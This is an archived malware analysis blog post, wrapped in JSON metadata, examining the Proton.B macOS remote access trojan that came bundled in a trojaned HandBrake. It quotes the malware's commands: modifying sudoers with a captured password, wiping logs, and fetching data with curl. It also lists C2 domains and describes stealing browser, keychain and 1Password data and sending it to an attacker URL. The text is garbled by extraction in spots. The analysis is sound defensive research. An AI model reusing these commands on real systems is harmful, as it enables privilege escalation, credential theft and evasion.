{
    "id": "3d42d5aa-d5a5-4020-9794-ae1ab7af192a",
    "created_at": "2023-01-12T15:09:50.892436Z",
    "updated_at": "2025-03-27T02:06:12.572834Z",
    "deleted_at": null,
    "sha1_hash": "d522a3f98aa4de788efdd8a4978752f32fb03ade",
    "title": "2017-05-10 - Proton.B- What this Mac malware actually does",
    "authors": "",
    "file_creation_date": "2022-05-28T19:24:35Z",
    "file_modification_date": "2022-05-28T19:24:35Z",
    "file_size": 2526971,
    "plain_text": "# Proton.B: What this Mac malware actually does\n\n**cybereason.com/labs-blog/labs-proton-b-what-this-mac-malware-actually-does**\n\nWritten By\nAmit Serper\n\nMay 10, 2017 | 6 minute read\n\nOver the weekend I downloaded a sample of the trojaned HandBrake software (Thanks Patrick Wardle at [Objective-See). In case you missed](https://objective-see.com/blog.html)\nit, hackers added a new variant of the Proton remote access tool to the very popular video encoding application. Proton, which targets macOS,\ndoes all kinds of nasty behavior, including stealing passwords, keylogging, exfiltrating files and enabling remote access log-in. For more\n[information on Proton, check out this report from Sixgill.](https://www.cybersixgill.com/proton-a-new-mac-os-rat/)\n\nIn [his blog, Patrick does a great job of explaining how attackers added Proton into HandBrake, a popular media-encoding app, so I’m not going](https://objective-see.com/blog/blog_0x1D.html)\nto discuss that. Instead, I'll look at what this variant, Proton.B, actually does after it’s executed and includes insights obtained from reverse\nengineering the malware. Proton’s authors included a few tricks meant to deceive researchers (like contacting an external service to obtain the\ndate and time and encrypting some of the strings and scripts and storing them in a separate file that will be decrypted upon execution).\n\n## How OSX/Proton actually works\n\nThe malicious file we’re dealing with is named activity_agent. When looking at activity_agent with a disassembler, it’s clear to see that it was\ndeveloped in Objective-C, which is macOS’ ‘native’ programming language, unlike other malware that’s written in C++ and uses other “cross\nplatform solutions” such as QT.\n\nWhen going through the binary with IDA Pro, I could see a lot of interesting things such as SSH tunneling capabilities. Sadly, I did not see this\nbehavior when I was examining the malware.\n\nOnce the file is executed, it decrypts a file called “.hash” that is located in the bundle’s Resources directory.\n\n\n-----\n\nThis file contains a large subset of strings that will then be loaded by activity_monitor binary. This is simply a method of hiding the strings from\nresearchers and antivirus software.\n\nWhen decrypted, “.hash” contains the following data:\n\n\n-----\n\n-----\n\n-----\n\n-----\n\nAs we can clearly see by the use of “%@”, this is Objective-C syntax, NSSTRING to be exact. In Objective-C “%@” is used for string\nformatting.\n\nWhen this file is being executed, what appears to be a legitimate dialog box appears and asks for the user’s password in order to install some\n“additional codecs.” But the text in the dialog box is actually in the contents of the decrypted “.hash” file.\n\n**Note: The text in that dialog box appears in the contents of the decrypted “.hash” file.**\n\nMac users should always think twice before entering their password into every dialog box. Dialog boxes asking for passwords are a very\npopular social engineering tactic designed to trick users into giving attackers their passwords. We’ve seen this method used in other malware\n[attacks. It can be done with installers (like in the case of OSX/Pirrit), with Applescript or, like in this case, by simply creating a dialog box that](https://www.cybereason.com/cybereason-labs-analysis-the-minds-behind-the-osx-pirrit/)\nfits the story. Since the user is in the sudoers list as in most Mac environments, knowing the user’s password is enough to escalate privileges\nto root.\n\nOnce users type in their password, the malware immediately starts to check if it is working by executing the following command:\n\n_'/bin/sh', '-c', \"echo 'qwer1234' | sudo -S echo success;\"_\n\nThe next step in that process is to disable the ‘tty_tickets’ flag in /etc/sudoers by executing the following command:\n\n\n-----\n\n_'/bin/sh', '-c', 'echo \\'printf \"\\\\033[8;1;1t\"; echo \"qwer1234\" | sudo -S sh -c \"echo \\'Defaults !tty_tickets\\' >> /etc/sudoers\"; killall Terminal; sleep_\n_1;\\'_\n\nTty_tickets is a feature that is enabled by default since macOS Sierra. The purpose of tty_tickets (when enabled) is to ask users for their\npassword every time they execute a ‘sudo’ command in a separate terminal. If disabled, users only have to enter their password once when\nrunning ‘sudo’ and it will be valid for any new terminal (tty) that the users execute a ‘sudo’ command in. My assumption is that tty_tickets is\nbeing disabled to make it easy for the malware authors’ scripting tasks; it’s easier to input a password once rather than several times in\ndifferent terminals.\n\nWhen looking at the strings section of activity_agent in IDA pro, we immediately spot a public key.\n\nThat key is being used in the following command line:\n\n_'/bin/sh', '-c', \"echo '-----BEGIN PUBLIC KEY-----_\n_\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwUP19DdW2NlkkdovqqwF\\n+r3sBaamka42zVMGa+COUCIysrVhVJIv4nmc57TLxg_\n_----END PUBLIC KEY-----' > /tmp/public.pem; openssl rsautl -verify -in /Users/test/Downloads/Proton/Proton.B/activity_agent.app/Contents/Resou_\n_/tmp/public.pem; openssl rsautl -verify -in /Users/test/Downloads/Proton/Proton.B/activity_agent.app/Contents/Resources/.tmpdata -pubin -inkey_\n\nThe key is being saved in a file called /tmp/public.pem. Once the key is saved, the malware then decrypts a file called .tmpdata, which also\nresides in the Resources directory of the bundle (Note: In POSIX filesystems such as in macOS and Linux, prepending a file name with a\n**“.” means that it’s hidden).**\n\nThe decrypted file, .tmpdata, contains the malware’s “license” in a JSON format. The license data is its “expiration date” and various\nchecksums.\n\n_{\"expiration_date\":\"2017-05-10 23:59:59_\n_+0000\",\"grace_period\":\"25\",\"bundle_name\":\"chameleo\",\"os_version\":\"10.x\",\"checksum\":\"128814f2b057aef1dd3e00f3749aed2a81e5ed03737311f_\n\nThe malware then conducts a test to see if it’s connected to the Internet by establishing a TCP connection to 8.8.8.8 (Google’s DNS server) for\n20 seconds.\n\n_'/bin/sh', '-c', 'nc -G 20 -z 8.8.8.8 53 >/dev/null 2>&1 && echo success'._\n\nThe malware also tries to connect to several other domains from the following list:\n\n\n-----\n\na db a esto e co\nhandbrake.cc\nluwenxdsnhgfxckcjgxvtugj.com\n6gmvshjdfpfbeqktpsde5xav.com\nkjfnbfhu7ndudgzhxpwnnqkc.com\nyaxw8dsbttpwrwlq3h6uc9eq.com\nqrtfvfysk4bdcwwwe9pxmqe9.com\nfyamakgtrrjt9vrwhmc76v38.com\nkcdjzquvhsua6hlfbmjzkzsb.com\nYpu4vwlenkpt29f95etrqllq.com\n\n**Note: The domains in red were not registered at the time of my research, although they were registered last night by an unknown entity. They**\nseem to be back up domains in case one of the first two stops working.\n\nAfter that, the malware checks for the time and date but interestingly enough, it appears that it does not trust the settings on the machine that\nit’s on running (because nasty researchers like us can mess with the local clock) and contacts an external service that’s hosted on Google. The\nmalware obtains the time and date by creating a new environment variable called $hcresult that contains what’s being returned by sending an\nHTTP request to the Google hosted link by executing this command:\n\n_hcresult=`curl -sL https://script.google.com/macros/s/AKfycbyd5AcbAnWi2Yn0xhFRbyzS4qMq1VucMVgVvhul5XqS9HkAyJY/exec`_\n\nThe program then continues to check if a file in the following path: ~/Library/VideoFrameworks/.ptrun (notice the “.” before the file name, which\nmakes it hidden) exists and notes that Proton.B’s installation process is working.\n\nOnce the malware sees that the license is still valid, it creates a new directory called ~/Library/Renderfiles, copies its own bundle to this\ndirectory and then deletes its entire bundle from where it was initially executed.\n\nAfterwards, it creates another directory - ~/Library/VideoFrameworks. This directory will store all of the stolen data that will soon be exfiltrated\nto the attackers.\n\nThe credentials that are being stolen, according to my research, were:\n\nGoogle Chrome profile and all saved data, including cookies, saved form data and passwords\nSafari profile and all saved data, including cookies, saved form data and passwords\nFirefox profile and all saved data, including cookies, saved form data and passwords\nOpera profile and all saved data, including cookies, saved form data and passwords\nMultiple keychains\n1Password data vaults\n\nEvery repository of passwords will be saved in a zip file:\n\nChrome data will be stored in CR_def.zip\nFirefox data will be stored in FF.zip\nOpera data will be stored in OP.zip\nKeychain data (from /Library/Keychains and ~/Library/keychain) will be stored in KC.zip\nGnupg and 1Password data from the following directories will be stored in GNU_PW.zip:\n\n~/.gnupg\n~/Library;/Application support/1Password 4\n~/Library;/Application support/1Password 3.9\n\nAll of that data will be zipped again to a file called Proton.zip. This file will be saved in the ~/Library/VideoFrameworks directory, which will then\nbe exfiltrated to the attackers.\n\nOnce all of the credentials are zipped, they are transmitted to the attackers using ‘curl’ to the url: http://api.handbrake.biz/api/init\n\nAfter all the zip files are created, the malware executes several killall commands and terminates these applications:\n\nConsole\nTerminal\nWi h k\n\n\n-----\n\ns step a es t a d o esea c e s to a a y e t s a a e e t u s s ce a o t ese p og a s be te ated u e pected y\nsimple workaround is to simplee tee the logs to another file, use iTerm instead of Terminal and tcpdump or Tshark instead of\nWireshark ¯\\_(ツ)_/¯.\n\nAfter terminating the aforementioned processes, the malware copies its own bundle to ~/Library/RenderFiles/activity_agent.app. It then adds\nthe following LaunchAgents to achieve persistence on the machine: ~/Library/LaunchAgents/fr.handbrake.actibity_agent.plist.\n\nAnd, of course, no malicious execution of malware is complete without the removal of logs. Proton.B does that by executing this command:\n\n_sudo -S rm -rf /var/log/* /Library/Logs/*_\n\n## Affected by Proton? Change your passwords\n\nMost of the Mac malware that’s out there is adware or rather simple campaigns. This is the first time researchers have had a live malware\nsample to play with and see its inner workings. Sadly, on the environment that I was testing the malware in, I couldn’t see any interactive\ncommand executions or any new connections that were initialized by the attackers to my research machine. I am sure that there is more to\nProton.B than this blog post covers. If you think you’ve been hit by Proton, change all of your passwords everywhere and assume that all of\nyour credentials have been compromised.\n\n[I’d like to recognize Thomas Reed, Pepijn Bruienne and the other good folks from the MacAdmins Slack group who provided helpful pointers](http://macadmins.org/)\nand clarifications.\n\nAbout the Author\n\n**Amit Serper**\n\nAmit Serper is Principal Security Researcher at Cybereason. He specializes in low-level, vulnerability and kernel research, malware analysis\nand reverse engineering on Windows, Linux and macOS.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-05-10 - Proton.B- What this Mac malware actually does.pdf"
    ],
    "report_names": [
        "2017-05-10 - Proton.B- What this Mac malware actually does.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536190,
    "ts_updated_at": 1743041172,
    "ts_creation_date": 1653765875,
    "ts_modification_date": 1653765875,
    "files": {
        "pdf": "https://archive.orkl.eu/d522a3f98aa4de788efdd8a4978752f32fb03ade.pdf",
        "text": "https://archive.orkl.eu/d522a3f98aa4de788efdd8a4978752f32fb03ade.txt",
        "img": "https://archive.orkl.eu/d522a3f98aa4de788efdd8a4978752f32fb03ade.jpg"
    }
}